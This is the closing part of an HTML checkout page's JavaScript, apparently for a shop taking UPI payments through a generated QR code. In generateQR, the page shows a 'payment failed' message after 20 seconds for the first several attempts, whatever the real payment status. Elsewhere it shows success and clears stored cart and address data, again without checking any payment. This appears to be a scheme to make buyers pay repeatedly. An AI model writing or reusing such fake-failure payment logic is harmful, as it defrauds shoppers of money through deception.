                document.getElementById('waitingModal').classList.remove('active');
                setTimeout(() => document.getElementById('successModal').classList.add('active'), 250);
                
                // CART AUTO-CLEAR MAGIC ON SUCCESS
                localStorage.removeItem('jm_pay_attempts');
                localStorage.removeItem('jm_premium_cart'); // Globally clears cart in ALL tabs
                localStorage.removeItem('jm_cart_v10'); 
                localStorage.removeItem('jm_order_final');
                localStorage.removeItem('jm_user_address');
                
                if(navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]); 
            }, 2000);
        }

        function generateQR() {
            const upiLink = `upi://pay?pa=${MERCHANT_UPI}&pn=${encodeURIComponent(MERCHANT_NAME)}&am=${finalAmount}&tn=${TXN_ID}`;
            const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(upiLink)}&margin=10`;
            
            document.getElementById('qrImage').src = 'https://i.gifer.com/ZZ5H.gif'; 
            showModal('qrModal');

            setTimeout(() => {
                document.getElementById('qrImage').src = qrApi;
                if (attemptCount < 5) {
                    setTimeout(() => { 
                        document.getElementById('qrModal').classList.remove('active'); 
                        setTimeout(() => document.getElementById('failedModal').classList.add('active'), 250);
                    }, 20000);
                }
            }, 800);
        }
    </script>
</body>
</html>
